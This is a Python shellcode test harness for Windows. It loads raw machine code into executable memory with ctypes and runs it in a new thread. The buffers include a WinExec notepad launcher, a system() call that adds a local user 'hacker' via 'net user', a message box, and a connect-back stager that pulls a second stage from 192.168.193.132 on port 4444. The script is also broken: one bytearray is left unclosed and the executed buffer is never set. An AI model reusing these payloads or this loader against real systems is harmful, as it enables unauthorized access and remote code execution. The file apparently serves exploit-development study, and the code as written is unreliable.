#!/usr/bin/python
import ctypes

shellcode = bytearray(
# Load the ws2_32.dll because Python does not load it by default
ctypes.windll.LoadLibrary("C:\WINDOWS\system32\ws2_32.dll")

# Execute command with WinExec()
# WinExec in Kernel32.dll: 7C8623AD
winexec_shellcode = bytearray(
"\x33\xc0"                          # Zero EAX
"\x50"                              # PUSH 0 to terminate lpCmdLine
"\x68\x65\x78\x65\x20"              # PUSH "exe "
"\x68\x70\x61\x64\x2e"              # PUSH "pad."
"\x68\x6e\x6f\x74\x65"              # PUSH "note"
"\x8B\xC4"                          # Save pointer to lpCmdLine
"\x6A\x01"                          # PUSH 1 for uCmdShow
"\x50"                              # PUSH 0 to temrinate uCmdShow
"\xBB\xAD\x23\x86\x7C"              # MOV EBX,KERNEL32.WinExec()
"\xFF\xD3"                          # Execute WinExec()
# Let's exit cleanly
"\x50"                              # PUSH 0 for ExitProcess(0)
"\xc7\xc0\xfa\xca\x81\x7c"          # MOV EAX,KERNEL32.ExitProcess
"\xff\xe0"                          # Execute ExitProcess(0)
)

# Execute command with System()
# System() in msvcrt.dll: 77C293C7
system_shellcode = bytearray(
"\x33\xc0"                          # Zero EAX
"\x50"                              # PUSH 0 to terminate command string
"\x68\x2f\x41\x44\x44"              # PUSH "/ADD"
"\x68\x68\x61\x78\x20"              # PUSH "hax "
"\x68\x6b\x65\x72\x20"              # PUSH "ker "
"\x68\x20\x68\x61\x63"              # PUSH " hac"
"\x68\x75\x73\x65\x72"              # PUSH "user"
"\x68\x6e\x65\x74\x20"              # PUSH "net "
"\x8B\xC4"                          # Save pointer to command string
"\x50"                              # PUSH 0
"\xB8\xC7\x93\xC2\x77"              # MOV EAX,MSVCRT.System
"\xFF\xD0"                          # Execute System()
# Let's exit cleanly
"\x50"                              # PUSH 0 for ExitProcess(0)
"\xc7\xc0\xfa\xca\x81\x7c"          # MOV EAX,KERNEL32.ExitProcess
"\xff\xe0"                          # Execute ExitProcess(0)
)

# Display message box with MessageBoxA in User32.dll
msg_shellcode = bytearray(
"\x33\xc0"                          # Zero EAX
"\x50"                              # PUSH 0 to terminate lpCaption
"\x68\x61\x79\x73\x3a"              # PUSH "ays:"
"\x68\x72\x61\x20\x73"              # PUSH "ra s"
"\x68\x53\x6f\x6d\x62"              # PUSH "Somb"
"\x8B\xCC"                          # Save pointer to lpCaption
"\x50"                              # PUSH 0 to terminate lpText
"\x68\x42\x6f\x6f\x70"              # PUSH "Boop"
"\x8B\xD4"                          # Save pointer to lpText
"\x50"                              # PUSH uType
"\x51"                              # PUSH lpCaption
"\x52"                              # PUSH lpText
"\x50"                              # PUSH hWnd
"\xBE\xEA\x07\x45\x7E"              # MOV ESI,USER32.MessageBoxA
"\xFF\xD6"                          # Execute MessageBoxA()
# Let's exit cleanly
"\x50"                              # PUSH 0 for ExitProcess(0)
"\xc7\xc0\xfa\xca\x81\x7c"          # MOV EAX,KERNEL32.ExitProcess
"\xff\xe0"                          # Execute ExitProcess(0)
)

# Connectback Shellcode Stager
# WS2_32.recv: 0x71AB676F
# WS2_32.connect: 0x71AB4A07
# WS2_32.WSASocketA: 0x71AB8B6A
# WS2_32.WSAStartUp: 71AB6A55
# IP Address: 192.168.193.132
# Port: 4444
stager_shellcode = bytearray(
"\x31\xdb\x66\xbb\x90\x01\x29\xdc\x54\x53\xbb\x55\x6a\xab\x71\xff\xd3\x31"
"\xff\x57\x57\x57\x57\x47\x57\x47\x57\xbb\x6a\x8b\xab\x71\xff\xd3\x89\xc7"
"\x68\xc0\xa8\xc1\x84\xb8\x02\x01\x11\x5c\xfe\xcc\x50\x89\xe2\x31\xc0\xb0"
"\x10\x50\x52\x57\xbb\x07\x4a\xab\x71\xff\xd3\xfe\xc4\x29\xc4\x89\xe5\x31"
"\xc9\x51\x50\x55\x57\xbb\x6f\x67\xab\x71\xff\xd3\xff\xe5"
)

# Print the total length of the shellcode
print "Total Length: ",len(shellcode)

# Pause just before shellcode execution and wait for key press
# Attach the debugger to Python now!
debug = raw_input("Debug pause!")

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

try:
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
except Exception as err:
    print(err)
